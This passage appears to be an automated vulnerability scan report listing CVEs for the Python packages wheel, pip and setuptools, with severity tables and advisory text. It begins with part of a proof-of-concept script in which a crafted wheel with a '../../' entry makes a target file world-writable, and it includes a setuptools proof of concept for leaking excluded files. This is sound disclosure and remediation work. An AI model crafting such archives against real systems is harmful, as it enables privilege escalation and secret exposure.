print(f"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}")

# 2. Run Vulnerable Unpack
# The wheel contains "../../poc_target.txt".
# unpack() will extract safely, BUT chmod() will hit the actual target file.
try:
    unpack("evil-1.0-py3-none-any.whl", "unpack_dest")
except Exception as e:
    print(f"[!] Ignored expected extraction error: {e}")

# 3. Check Result
final_perms = oct(target.stat().st_mode)[-3:]
print(f"[*] Final Perms: {final_perms}")

if final_perms == "777":
    print("VULNERABILITY CONFIRMED: Target file is now world-writable (777)!")
else:
    print("[-] Attack failed.")
```  

**result:**  
<img width="806" height="838" alt="image" src="https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db" />  
  
### Impact  
Attackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.  

### Recommended Fix  
The unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().  

### Suggested Patch:  
```
# extract() returns the actual path where the file was written
extracted_path = wf.extract(zinfo, destination)

# Only apply chmod if a file was actually written
if extracted_path:
    permissions = zinfo.external_attr >> 16 & 0o777
    Path(extracted_path).chmod(permissions)
```

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 5" src="https://img.shields.io/badge/M-5-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>pip</strong> <code>24.0</code> (pypi)</summary>

<small><code>pkg:pypi/pip@24.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-8869?s=github&n=pip&t=pypi&vr=%3C%3D25.2"><img alt="medium 5.9: CVE--2025--8869" src="https://img.shields.io/badge/CVE--2025--8869-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Improper Link Resolution Before File Access ('Link Following')</i>

<table>
<tr><td>Affected range</td><td><code><=25.2</code></td></tr>
<tr><td>Fixed version</td><td><code>25.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.469%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a "fixed" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the "vulnerable" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-13346?s=github&n=pip&t=pypi&vr=%3C26.2.0"><img alt="medium 5.6: CVE--2026--13346" src="https://img.shields.io/badge/CVE--2026--13346-lightgrey?label=medium%205.6&labelColor=fbb552"/></a> <i>Absolute Path Traversal</i>

<table>
<tr><td>Affected range</td><td><code><26.2.0</code></td></tr>
<tr><td>Fixed version</td><td><code>26.2.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:P/PR:H/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.292%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

pip would incorrectly handle doubly-encoded package URLs from indexes allowing for files to be installed to arbitrary locations on disk even when installing wheels.

This vulnerability requires downloading or installing a package from a malicious package index to succeed, malicious packages alone are not able to exploit this vulnerability. Note that this vulnerability only materially impacts users running `pip download` with the `--only-binary` option as installing source distributions from an untrusted index is already an unsafe operation that executes code during install time.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-6357?s=github&n=pip&t=pypi&vr=%3C26.1"><img alt="medium 5.3: CVE--2026--6357" src="https://img.shields.io/badge/CVE--2026--6357-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Inclusion of Functionality from Untrusted Control Sphere</i>

<table>
<tr><td>Affected range</td><td><code><26.1</code></td></tr>
<tr><td>Fixed version</td><td><code>26.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:P/PR:H/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.171%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

pip prior to version 26.1 would run self-update check functionality after installing wheel files which required importing well-known Python modules names. These module imports were intentionally deferred to increase startup time of the pip CLI. The patch changes self-update functionality to run before wheels are installed to prevent newly-installed modules from being imported shortly after the installation of a wheel package. Users should still review package contents prior to installation.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-3219?s=github&n=pip&t=pypi&vr=%3C%3D26.0.1"><img alt="medium 4.6: CVE--2026--3219" src="https://img.shields.io/badge/CVE--2026--3219-lightgrey?label=medium%204.6&labelColor=fbb552"/></a> <i>Unrestricted Upload of File with Dangerous Type</i>

<table>
<tr><td>Affected range</td><td><code><=26.0.1</code></td></tr>
<tr><td>Fixed version</td><td><code>26.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>4.6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.180%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

pip handles concatenated tar and ZIP files as ZIP files regardless of filename or whether a file is both a tar and ZIP file. This behavior could result in confusing installation behavior, such as installing "incorrect" files according to the filename of the archive. New behavior only proceeds with installation if the file identifies uniquely as a ZIP or tar archive, not as both.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-8643?s=github&n=pip&t=pypi&vr=%3C26.1.2"><img alt="medium 4.1: CVE--2026--8643" src="https://img.shields.io/badge/CVE--2026--8643-lightgrey?label=medium%204.1&labelColor=fbb552"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><26.1.2</code></td></tr>
<tr><td>Fixed version</td><td><code>26.1.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>4.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.466%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

pip would treat console_scripts and gui_scripts as paths instead of file names without sanitizing the resolved absolute path to the installation directory, leading to entry points being installed outside the installation directory.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-1703?s=github&n=pip&t=pypi&vr=%3C26.0"><img alt="low 2.0: CVE--2026--1703" src="https://img.shields.io/badge/CVE--2026--1703-lightgrey?label=low%202.0&labelColor=fce1a9"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><26.0</code></td></tr>
<tr><td>Fixed version</td><td><code>26.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.443%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>setuptools</strong> <code>79.0.1</code> (pypi)</summary>

<small><code>pkg:pypi/setuptools@79.0.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-59890?s=github&n=setuptools&t=pypi&vr=%3C83.0.0"><img alt="medium 6.1: CVE--2026--59890" src="https://img.shields.io/badge/CVE--2026--59890-lightgrey?label=medium%206.1&labelColor=fbb552"/></a> <i>Improper Handling of Unicode Encoding</i>

<table>
<tr><td>Affected range</td><td><code><83.0.0</code></td></tr>
<tr><td>Fixed version</td><td><code>83.0.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.405%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

When building a source distribution (`python -m build --sdist` / `setup.py sdist`), setuptools' `FileList` applies `MANIFEST.in` directives (`exclude`, `global-exclude`, `recursive-exclude`, `prune`) by matching a compiled glob against on-disk file names **byte-for-byte, with no Unicode normalization**. On normalization-preserving filesystems (notably macOS APFS and HFS+), a file written in NFD and a `MANIFEST.in` rule written in NFC refer to the same file but are byte-distinct, so the exclusion silently fails to match. A file the maintainer intended to exclude is then packed into the `.tar.gz` and, if published, uploaded to the public, immutable PyPI index.

## Details

File names in `FileList.files` come from `os.walk` (`setuptools/_distutils/filelist.py`, `_find_all_simple`), so on APFS a file written NFD is offered to the matcher in NFD, while the `MANIFEST.in` pattern carries the author's editor form (typically NFC). The matching path performs no canonicalization:

```python
# setuptools/command/egg_info.py  (FileList.global_exclude)
def global_exclude(self, pattern):
    match = translate_pattern(os.path.join('**', pattern))   # fnmatch.translate -> regex, no NFC/NFD
    return self._remove_files(match.match)                   # byte-level regex over raw os.walk names
```

A rule written NFC (`café` = `63 61 66 c3 a9`) does not match an on-disk name written NFD (`café` = `63 61 66 65 cc 81`), even though the filesystem treats the two as one file.

A `unicodedata.normalize('NFD', ...)` helper exists in `setuptools/unicode_utils.py` (`decompose()`), but it is **never called in the manifest matching path**, so neither the pattern nor the walked path is normalized before matching. The only normalization in this area, `EggInfoCommand._manifest_normalize`, uses `filesys_decode` (bytes→str decode only, no NFC/NFD) and runs when writing `SOURCES.txt`, after matching has already occurred.

## Impact

`MANIFEST.in` exclusions are the documented mechanism maintainers use to keep secrets, local configs, and private fixtures out of the published sdist. A non-ASCII excluded file may be published to the public, immutable PyPI index despite the rule — an irreversible disclosure with no visual cue (NFC and NFD forms render identically). Exposure is filesystem-dependent and most relevant on macOS APFS/HFS+, where many maintainers build and publish. Pure-ASCII rules are unaffected.

## Proof of concept

With a project containing `MANIFEST.in`:

```
global-include *.txt *.json
global-exclude secret_café.txt    # rule saved NFC
```

and an on-disk file `secret_café.txt` written in NFD, `python -m build --sdist` packs the secret file into the resulting `.tar.gz`, while an ASCII control file excluded by the same directive is correctly dropped — isolating the bypass to the NFC-pattern vs. NFD-name mismatch. Reproduced on macOS APFS with setuptools 82.0.1.

## Remediation

Normalize both the walked path and each `MANIFEST.in` pattern to a single canonical form before matching, in both `setuptools/command/egg_info.py` (`FileList`) and the vendored `setuptools/_distutils/filelist.py`. For an exclusion list, err toward excluding more, and document that `MANIFEST.in` matching is normalization-insensitive on macOS.

## Credit

Reported by Tomas Illuminati. Coordinated via CERT/CC VINCE VU#604762.

</blockquote>
</details>
</details></td></tr>
</table>

